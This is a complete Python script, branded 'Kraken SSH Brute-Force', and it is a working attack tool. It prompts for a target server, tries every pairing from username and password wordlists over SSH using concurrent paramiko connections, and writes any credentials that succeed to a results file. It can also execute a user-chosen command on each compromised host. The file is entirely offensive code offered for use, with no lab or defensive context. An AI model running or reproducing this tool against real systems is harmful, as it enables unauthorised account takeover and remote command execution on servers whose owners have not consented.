import os
import sys
import time
import socket
import logging
import paramiko
from random import choice
import gevent
from gevent import monkey
from gevent.pool import Pool


monkey.patch_all()


try:
    from colorama import Fore, Style, init
    import pyfiglet
except ImportError as e:
    missing_module = str(e).split("named ")[-1]
    print(f"The required module '{missing_module}' is not installed.")
    print("Please install all dependencies using 'pip install -r requirements.txt'.")
    sys.exit(1)


init(autoreset=True)


script_dir = os.path.dirname(os.path.abspath(__file__))
results_dir = os.path.join(script_dir, '..', 'Results')
logs_dir = os.path.join(script_dir, '..', 'Logs')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


logging.basicConfig(filename=os.path.join(logs_dir, 'ssh_brute_force.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the banner for the script."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken SSH Brute-Force", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def load_file(file_path):
    """Loads usernames or passwords from a specified file."""
    if os.path.isfile(file_path):
        with open(file_path, "r", encoding="utf-8") as file:
            return [line.strip() for line in file if line.strip()]
    else:
        logging.error(f"File not found: {file_path}")
        sys.exit(1)

def check_ssh_port(target, port):
    """Checks if the SSH port is open on the target."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            return sock.connect_ex((target, port)) == 0
    except socket.gaierror as e:
        logging.error(f"Network error: {e}")
        return False

def login_attempt(ip, username, password, port, cmd, attempt_number, total_attempts, start_time, result_file):
    """Attempts to log in to the SSH server using provided credentials."""
    def format_output(success):
        elapsed_time = time.time() - start_time
        percentage = (attempt_number / total_attempts) * 100
        estimated_total_time = elapsed_time / (attempt_number / total_attempts)
        remaining_time = estimated_total_time - elapsed_time
        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))
        status = "Success" if success else ""
        return f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password} {status}"

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=ip, username=username, password=password, port=port, timeout=10)
        sys.stdout.write('\033[K')  
        success_msg = format_output(True)
        print(Style.BRIGHT + Fore.GREEN + success_msg + Style.RESET_ALL)
        logging.info(success_msg.strip())
        result_file.write(success_msg.strip() + "\n")
        result_file.flush()  

        if cmd:
            stdin, stdout, stderr = client.exec_command(cmd, get_pty=True)
            output = stdout.read().decode().strip()
            print(Fore.CYAN + f"Command output: {output}")

        return success_msg
    except Exception as e:
        sys.stdout.write('\033[K')  
        fail_msg = format_output(False)
        print(Fore.WHITE + fail_msg, end='', flush=True)
        logging.debug(f"Login failed for {username}:{password} @ {ip}: {e}")
        return None
    finally:
        client.close()

def run_brute_force(ip, port, usernames, passwords, cmd, threads):
    """Executes brute force login attempts using gevent pool."""
    total_attempts = len(usernames) * len(passwords)
    start_time = time.time()
    attempt_number = 0
    results = []
    pool = Pool(threads)

    result_file_path = os.path.join(results_dir, "ssh_results.txt")
    with open(result_file_path, "a") as result_file:  

        def handle_result(username, password):
            nonlocal attempt_number
            attempt_number += 1
            result = login_attempt(ip, username, password, port, cmd, attempt_number, total_attempts, start_time, result_file)
            if result:
                results.append(result)

        for username in usernames:
            for password in passwords:
                pool.spawn(handle_result, username, password)

        pool.join()

    logging.info("Brute force process completed.")

def get_user_input():
    """Gets user input for the brute-force operation."""
    print(Style.BRIGHT + Fore.YELLOW + "Input Configuration" + Style.RESET_ALL)
    target_ip = input(Fore.WHITE + "Enter the SSH server IP address: ").strip()
    port = int(input(Fore.WHITE + "Enter the port of the SSH server (default: 22, press Enter for default): ") or 22)

    if check_ssh_port(target_ip, port):
        user_file = input(Fore.WHITE + "Enter path to username list (default: users.txt): ").strip() or os.path.join(script_dir, "..", "wordlists", "users.txt")
        pwd_file = input(Fore.WHITE + "Enter path to password list (default: passwords.txt): ").strip() or os.path.join(script_dir, "..", "wordlists", "passwords.txt")
        cmd = input(Fore.WHITE + "Enter the command to execute upon successful authentication (optional): ").strip()
        threads = int(input(Fore.WHITE + "Enter number of threads to use (default: 40, press Enter for default): ") or 40)
        users = load_file(user_file)
        pwds = load_file(pwd_file)

        return target_ip, port, users, pwds, cmd, threads
    else:
        logging.error(Fore.RED + f"SSH port {port} is not open. Check the target IP or server status.")
        sys.exit(1)

def main():
    clear_console()
    display_banner()
    target_ip, port, users, pwds, cmd, threads = get_user_input()
    print(Style.RESET_ALL + Fore.WHITE + "\n" + "="*80 + "\n")
    run_brute_force(target_ip, port, users, pwds, cmd, threads)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info(Fore.YELLOW + "\nScript interrupted by user.")
